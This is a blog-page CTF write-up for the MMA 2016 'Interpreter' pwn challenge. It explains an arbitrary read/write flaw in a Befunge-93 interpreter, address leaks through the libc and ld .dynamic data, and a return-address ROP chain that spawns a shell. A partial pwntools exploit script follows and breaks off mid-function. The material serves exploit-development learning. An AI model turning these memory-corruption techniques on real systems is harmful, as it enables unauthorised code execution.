<!DOCTYPE html>



<html lang="zh-TW" 
  
    mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="MMA 2nd CTF 2016 – Interpreter" />
<meta property="og:locale" content="zh_TW" />
<meta name="description" content="Category: pwn Points: 200" />
<meta property="og:description" content="Category: pwn Points: 200" />
<link rel="canonical" href="http://0.0.0.0:4000/mma-2nd-ctf-2016-interpreter/" />
<meta property="og:url" content="http://0.0.0.0:4000/mma-2nd-ctf-2016-interpreter/" />
<meta property="og:site_name" content="Hacking Tube 2.0" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2016-09-13T00:45:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="MMA 2nd CTF 2016 – Interpreter" />
<meta name="twitter:site" content="@bruce30262" />
<script type="application/ld+json">
{"mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/mma-2nd-ctf-2016-interpreter/"},"url":"http://0.0.0.0:4000/mma-2nd-ctf-2016-interpreter/","@type":"BlogPosting","headline":"MMA 2nd CTF 2016 – Interpreter","dateModified":"2021-07-19T21:12:41+08:00","datePublished":"2016-09-13T00:45:00+08:00","description":"Category: pwn Points: 200","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>MMA 2nd CTF 2016 -- Interpreter | Hacking Tube 2.0
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Hacking Tube 2.0">
<meta name="application-name" content="Hacking Tube 2.0">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScripts -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  



  <!-- image lazy-loading & popup -->
  <script async
    src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>






</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/images/other/gravatar.png" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">Hacking Tube 2.0</a>
    </div>

    <div class="site-subtitle font-italic">Security and stuff</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/bruce30262" aria-label="github"
        
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/bruce30262" aria-label="twitter"
        
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['bruce30262','pm.me'].join('@')" aria-label="email"
        
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
          <span>MMA 2nd CTF 2016 -- Interpreter</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->




<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>MMA 2nd CTF 2016 -- Interpreter</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Bruce Chen
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Tue, Sep 13, 2016, 12:45 AM +0800"
  

  
  prep="on" >

  
  

  
    Sep 13, 2016
  

  <i class="unloaded">2016-09-13T00:45:00+08:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          
          <span>
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago lastmod"
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Mon, Jul 19, 2021,  9:12 PM +0800"
  

  prefix="Updated "
   >

  
  

  
    Jul 19
  

  <i class="unloaded">2021-07-19T21:12:41+08:00</i>

</span>

          </span>
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1807 words">10 min</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <p><strong>Category:</strong> pwn<br />
<strong>Points:</strong> 200</p>

<!-- more -->

<p>64 bit ELF, with <strong>FULL RELRO</strong>, <strong>NX</strong>, <strong>stack guard</strong> &amp; <strong>PIE</strong> enabled.</p>

<p>After doing some reversing, we found that it’s a <a href="https://en.wikipedia.org/wiki/Befunge">Befunge-93 program</a> interpreter. It will first read some <a href="https://en.wikipedia.org/wiki/Befunge#Befunge-93_instruction_list">Befunge-93 instructions</a> (at most 20000 characters), then interpret &amp; execute those instructions. The program will store those instructions at the <code class="language-plaintext highlighter-rouge">program</code> buffer, and the maximum of the executed instructions is 10000.</p>

<p>Here’s the pseudo code of the main function:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre></td><td class="rouge-code"><pre><span class="c1">// here I only list some important features of the program</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Welcome to Online Befunge(93) Interpreter"</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Please input your program."</span><span class="p">);</span>
    <span class="n">program</span> <span class="o">=</span> <span class="n">read_program</span><span class="p">();</span> <span class="c1">// read user input to buffer 'program'</span>

    <span class="n">step</span> <span class="o">=</span> <span class="mi">10001</span><span class="p">;</span>
    <span class="n">row</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">col</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">do</span>
    <span class="p">{</span>
        <span class="n">ins</span> <span class="o">=</span> <span class="n">program</span><span class="p">[</span><span class="mi">80</span> <span class="o">*</span> <span class="n">row</span> <span class="o">+</span> <span class="n">col</span><span class="p">]</span>
            <span class="k">switch</span> <span class="p">(</span> <span class="n">ins</span> <span class="p">)</span>
            <span class="p">{</span>
                <span class="p">.....</span><span class="c1">//other instruction...</span>
                <span class="k">case</span> <span class="sc">'&amp;'</span><span class="p">:</span> <span class="c1">// ask user for a number and push it to stack</span>
                    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">);</span>
                    <span class="n">push</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="sc">'.'</span><span class="p">:</span> <span class="c1">// Pop value and output as an integer followed by a space</span>
                    <span class="n">x</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
                    <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">"%d "</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                    <span class="p">.....</span><span class="c1">//other instruction...</span>
                <span class="k">case</span> <span class="sc">'*'</span><span class="p">:</span>  <span class="c1">// pop x, y, push x*y</span>
                    <span class="n">a</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
                    <span class="n">b</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
                    <span class="n">push</span><span class="p">(</span><span class="n">a</span> <span class="o">*</span> <span class="n">b</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                        <span class="p">.....</span><span class="c1">//other instruction...</span>
                <span class="k">case</span> <span class="sc">'g'</span><span class="p">:</span> <span class="c1">// (get) Pop x and y, then push ASCII value of the character at that position in the program</span>
                    <span class="n">x</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
                    <span class="n">y</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
                    <span class="n">push</span><span class="p">(</span> <span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">program</span><span class="p">[</span><span class="mi">80</span> <span class="o">*</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span><span class="p">])</span> <span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="sc">'p'</span><span class="p">:</span> <span class="c1">// (put) Pop x, y, and z, then change the character at (x,y) in the program to the character with ASCII value z</span>
                    <span class="n">x</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
                    <span class="n">y</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
                    <span class="n">z</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
                    <span class="n">program</span><span class="p">[</span><span class="mi">80</span> <span class="o">*</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">z</span><span class="p">;</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="sc">' '</span><span class="p">:</span> <span class="c1">// space = do nothing</span>
                    <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="o">--</span><span class="n">step</span><span class="p">;</span>
        <span class="c1">// update row &amp; column</span>
        <span class="c1">// do other stuff...</span>
    <span class="p">}</span><span class="k">while</span> <span class="p">(</span> <span class="n">step</span> <span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Too many steps. Is there any infinite loops?"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>After we took some good look at the main function, we found that we’re able to trigger the <strong>read/write anywhere</strong> vulnerability by doing the followings:</p>

<ul>
  <li>By using the <code class="language-plaintext highlighter-rouge">&amp;</code>, <code class="language-plaintext highlighter-rouge">g</code> and <code class="language-plaintext highlighter-rouge">.</code> instructions, we’re able to read the content of any memory address.
    <ul>
      <li>Use <code class="language-plaintext highlighter-rouge">&amp;</code> to push an integer on the <code class="language-plaintext highlighter-rouge">Stack</code> (notice the uppercase S, this <code class="language-plaintext highlighter-rouge">Stack</code> variable is a buffer that the interpreter use to simulate the stack in a Befunge-93 program).</li>
      <li>By doing <code class="language-plaintext highlighter-rouge">g</code>, the interpreter will first pop two values (let’s say <code class="language-plaintext highlighter-rouge">x</code> &amp; <code class="language-plaintext highlighter-rouge">y</code> ) from <code class="language-plaintext highlighter-rouge">Stack</code> and push the content of <code class="language-plaintext highlighter-rouge">program[80 * x + y]</code> to the <code class="language-plaintext highlighter-rouge">Stack</code>. Since we can control the value of <code class="language-plaintext highlighter-rouge">x</code> &amp; <code class="language-plaintext highlighter-rouge">y</code>, we can push the content of any address on Stack, and print it out by using the <code class="language-plaintext highlighter-rouge">.</code> instruction.</li>
      <li>Notice that the <code class="language-plaintext highlighter-rouge">&amp;</code> instruction only make us able to push an integer (32 bit) on the <code class="language-plaintext highlighter-rouge">Stack</code>. If we want to read the content that is far away from the <code class="language-plaintext highlighter-rouge">program</code> buffer, the value of <code class="language-plaintext highlighter-rouge">x</code> &amp; <code class="language-plaintext highlighter-rouge">y</code> might have to be an <strong>long integer</strong>. To solve this problem, we can use the <code class="language-plaintext highlighter-rouge">*</code> instruction. It will pop two values (<code class="language-plaintext highlighter-rouge">x</code> &amp; <code class="language-plaintext highlighter-rouge">y</code>) from the <code class="language-plaintext highlighter-rouge">Stack</code> and push <code class="language-plaintext highlighter-rouge">x * y</code> to <code class="language-plaintext highlighter-rouge">Stack</code>. It uses 64 bit registers during the whole operation, thus we can use this method to place a long integer on the <code class="language-plaintext highlighter-rouge">Stack</code>, then use <code class="language-plaintext highlighter-rouge">g</code> &amp; <code class="language-plaintext highlighter-rouge">.</code> to leak the content of any memory address.</li>
    </ul>
  </li>
  <li>With the aforementioned methods, we can also use the <code class="language-plaintext highlighter-rouge">p</code> instruction to overwrite the content of any memory address.</li>
</ul>

<p>So now we can leak and overwrite the content of whatever the memory address we want. The first thing we do is to leak the libc’s base address. Here I leak the address of <code class="language-plaintext highlighter-rouge">__libc_start_main</code>’s GOT, and use <a href="https://github.com/niklasb/libc-database">libc-database</a> to get the libc’s version.</p>

<p>Now we’ll have to overwrite some address to hijack the control flow. Notice that there’s no function pointer in the program, and GOT were all read-only due to the FULL RELRO protection. The only way we can do this is to <strong>overwrite the return address.</strong></p>

<p>So now we’ll have to get the stack address. But how? There’s no format string vulnerability, so it’s hard (nearly impossible) for us to leak the saved ebp or argv address on the stack. Also there’s no <code class="language-plaintext highlighter-rouge">malloc</code> or <code class="language-plaintext highlighter-rouge">mmap</code>, so it’s also impossible for us to locate the .tls section address and leak the pointer to stack which is placed in the very section.</p>

<p>By the time I was solving this challenge, the only way left I know is to leak the <code class="language-plaintext highlighter-rouge">__libc_stack_end</code> symbol in the <code class="language-plaintext highlighter-rouge">ld-linux.so</code>. To achieve this I’ll have to leak the <code class="language-plaintext highlighter-rouge">ld-linux.so</code>’s base address from the <code class="language-plaintext highlighter-rouge">DT_DEBUG</code> info, which is placed in the .dynamic section of the binary. As for the version of the <code class="language-plaintext highlighter-rouge">ld-linux.so</code>, I just assume it’s the same version with the libc.so, which is Ubuntu 14.04, 64bit. Luckily, the actual binary can be retrieved from my other VM.</p>

<p>It took me a lot of time and work to do the whole thing, and the method’s not elegant. Fortunately, it worked, and I was able to overwrite the return address with the typical x64 ROP chain: <code class="language-plaintext highlighter-rouge">pop_rdi --&gt; bin_sh --&gt;system</code>. At last, we are able to spawn a shell and get the flag.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">math</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s">"pwn1.chal.ctf.westerns.tokyo"</span> 
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">62839</span>
<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./befunge_patch"</span>
<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"/lib/x86_64-linux-gnu/libc.so.6"</span>

<span class="c1"># setting 
</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
<span class="n">context</span><span class="p">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">my_recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">delim</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">while</span> <span class="n">delim</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
        <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">c</span>
        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">res</span>

<span class="k">def</span> <span class="nf">myexec</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">str_addr</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">f</span><span class="p">):</span> <span class="c1"># search string address in file
</span>    <span class="n">result</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">):</span> <span class="c1"># no result
</span>        <span class="k">return</span> <span class="bp">None</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">leak_one_byte</span><span class="p">(</span><span class="n">off_1</span><span class="p">,</span> <span class="n">off_80</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">off_1</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">off_80</span><span class="p">))</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">leak_addr</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="n">off_80</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="n">ret_addr</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="n">base</span><span class="o">+</span><span class="mi">6</span><span class="p">):</span>
        <span class="k">print</span> <span class="s">"leaking %s byte : %d"</span> <span class="o">%</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">cnt</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">leak_one_byte</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">off_80</span><span class="p">)</span>
        <span class="n">ret_addr</span> <span class="o">=</span> <span class="n">ret_addr</span> <span class="o">|</span> <span class="p">((</span><span class="n">ret</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="o">*</span><span class="n">cnt</span><span class="p">)</span>
        <span class="n">cnt</span> <span class="o">+=</span> <span class="mi">1</span>

    <span class="k">return</span> <span class="n">ret_addr</span>

<span class="k">def</span> <span class="nf">cal_offset</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">text_base</span><span class="p">):</span>
    <span class="n">start_from</span> <span class="o">=</span> <span class="n">text_base</span> <span class="o">+</span> <span class="mh">0x202040</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="n">start_from</span>
    <span class="n">off_80</span> <span class="o">=</span> <span class="n">offset</span><span class="o">/</span><span class="mi">80</span>
    <span class="n">off_1</span> <span class="o">=</span> <span class="n">offset</span><span class="o">%</span><span class="mi">80</span>

    <span class="k">return</span> <span class="n">off_1</span><span class="p">,</span> <span class="n">off_80</span>

<span class="k">def</span> <span class="nf">leak_far_addr</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
    <span class="n">ret_addr</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">off_1</span><span class="p">,</span> <span class="n">off_80</span> <span class="o">=</span> <span class="n">cal_offset</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">text_base</span><span class="p">)</span>
    <span class="n">temp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">math</span><span class="p">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">off_80</span><span class="p">))</span>
    <span class="n">off_1</span> <span class="o">=</span> <span class="p">(</span><span class="n">off_80</span> <span class="o">-</span> <span class="n">temp</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span><span class="o">*</span><span class="mi">80</span> <span class="o">+</span> <span class="n">off_1</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">off_1</span><span class="p">,</span> <span class="n">off_1</span><span class="o">+</span><span class="mi">6</span><span class="p">):</span>
        <span class="k">print</span> <span class="s">"leaking %s byte : %d"</span> <span class="o">%</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">cnt</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" "</span><span class="p">))</span>
        <span class="n">ret_addr</span> <span class="o">=</span> <span class="n">ret_addr</span> <span class="o">|</span> <span class="p">((</span><span class="n">ret</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="o">*</span><span class="n">cnt</span><span class="p">)</span>
        <span class="n">cnt</span> <span class="o">+=</span> <span class="mi">1</span>

    <span class="k">return</span> <span class="n">ret_addr</span>

<span class="k">def</span> <span class="nf">write_far_addr</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
    <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">off_1</span><span class="p">,</span> <span class="n">off_80</span> <span class="o">=</span> <span class="n">cal_offset</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">text_base</span><span class="p">)</span>
    <span class="n">temp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">math</span><span class="p">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">off_80</span><span class="p">))</span>
    <span class="n">off_1</span> <span class="o">=</span> <span class="p">(</span><span class="n">off_80</span> <span class="o">-</span> <span class="n">temp</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span><span class="o">*</span><span class="mi">80</span> <span class="o">+</span> <span class="n">off_1</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">off_1</span><span class="p">,</span> <span class="n">off_1</span><span class="o">+</span><span class="mi">6</span><span class="p">):</span>
